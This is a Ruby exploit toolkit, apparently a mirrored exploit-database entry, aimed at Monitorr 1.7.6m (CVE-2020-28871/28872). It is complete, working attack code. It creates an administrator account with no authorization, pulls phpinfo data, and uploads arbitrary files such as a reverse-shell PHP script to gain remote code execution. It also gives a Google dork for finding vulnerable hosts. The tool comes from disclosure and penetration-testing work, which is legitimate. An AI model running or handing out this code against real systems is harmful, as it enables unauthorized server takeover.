@@ -1,0 +1,127 @@
+id: 36471
+date: 06/23/2021
+title: Monitorr 1.7.6m Bypass / Information Disclosure / Shell Upload Exploit
+author: Alexandre ZANNI
+cves: CVE-2020-28871, CVE-2020-28872
+
+#!/usr/bin/env ruby
+
+# Exploit
+## Title: Monitorr exploit toolkit
+## Google Dorks:
+##   inurl:/assets/config/_installation/_register.php?action=register
+## Author: noraj (Alexandre ZANNI) for SEC-IT (http://secit.fr)
+## Author website: https://pwn.by/noraj/
+## Exploit source: https://github.com/sec-it/monitorr-exploit-toolkit
+## Date: 2021-06-22
+## Vendor Homepage: https://github.com/Monitorr/Monitorr/
+## Software Link: https://github.com/Monitorr/Monitorr/archive/refs/tags/1.7.6m.tar.gz
+## Version: at least 1.7.6m
+## Tested on: OpenNetAdmin 1.7.6.m
+
+require 'pathname'
+require 'httpx'
+require 'docopt'
+
+doc = <<~DOCOPT
+  Monitorr-Exploit
+
+  Usage:
+    #{__FILE__} upload <url> <file> [--debug]
+    #{__FILE__} create <url> <user> <pass> <email> [--debug]
+    #{__FILE__} version <url> [--debug]
+    #{__FILE__} phpinfo <url> [--debug]
+    #{__FILE__} -h | --help
+
+  upload:       Upload a file (RCE via unrestricted file upload)
+  version:      Try to fetch Monitorr version
+  phpinfo:      Extract main phpinfo() information (Information leakage)
+  create:       Create an administrator account (Authorization bypass)
+
+  Options:
+    <url>       Root URL (base path) including HTTP scheme, port and root folder
+    <file>      File to be uploaded
+    --debug     Display arguments
+    -h, --help  Show this screen
+
+  Examples:
+    #{__FILE__} upload http://example.org revshell.php
+    #{__FILE__} create https://example.org:8080/monitorr/ noraj password 'noraj@pentest.local'
+    #{__FILE__} version https://example.org:7000/
+DOCOPT
+
+def version(root_url)
+  vuln_url = "#{root_url}/assets/js/version/version.txt"
+
+  HTTPX.get(vuln_url).body.to_s
+end
+
+def phpinfo(root_url)
+  vuln_url = "#{root_url}/assets/php/phpinfo.php"
+
+  res = HTTPX.get(vuln_url).body.to_s
+  sys = res.match(/>System\s?<\/td><td .+>(.+)<\/td>/).captures[0].chomp
+  phpver = res.match(/>PHP Version\s?<\/td><td .+>(.+)<\/td>/).captures[0].chomp
+  disablef = res.match(/>disable_functions\s?<\/td><td .+>(.+)<\/td>/).captures[0].chomp
+  openb = res.match(/>open_basedir\s?<\/td><td .+>(.+)<\/td>/).captures[0].chomp
+
+  "System: #{sys}\nPHP version: #{phpver}\ndisable_functions: #{disablef}\nopen_basedir: #{openb}\n\n" \
+    "Full phpinfo() location: #{vuln_url}"
+end
+
+# Password size should be >= 6
+def create_user(root_url, username, password, email)
+  vuln_url = "#{root_url}/assets/config/_installation/_register.php?action=register"
+
+  params = {
+    'user_name' => username,
+    'user_email' => email,
+    'user_password_new' => password,
+    'user_password_repeat' => password,
+    'register' => 'Register'
+  }
+
+  success = HTTPX.post(vuln_url, form: params).body.to_s.match?(/User credentials have been created successfully/)
+
+  return '[-] User not created' unless success
+
+  "[+] User created\nUsername: #{username}\nEmail: #{email}\nPassword: #{password}"
+end
+
+def upload(root_url, filepath)
+  vuln_url = "#{root_url}/assets/php/upload.php"
+  pn = Pathname.new(filepath)
+
+  params = {
+    fileToUpload: {
+      content_type: 'image/gif',
+      filename: pn.basename.to_s,
+      body: pn
+    }
+  }
+
+  res = HTTPX.plugin(:multipart).post(vuln_url, form: params)
+
+  return '[-] File not upload' unless (200..299).include?(res.status)
+
+  "[+] File uploaded:\n#{root_url}/assets/data/usrimg/#{pn.basename}"
+end
+
+begin
+  args = Docopt.docopt(doc)
+  pp args if args['--debug']
+
+  if args['version']
+    puts version(args['<url>'])
+  elsif args['phpinfo']
+    puts phpinfo(args['<url>'])
+  elsif args['create']
+    puts create_user(args['<url>'], args['<user>'], args['<pass>'], args['<email>'])
+  elsif args['upload']
+    puts upload(args['<url>'], args['<file>'])
+  end
+rescue Docopt::Exit => e
+  puts e.message
+end
+
+#  0day.today [2023-03-24]  #
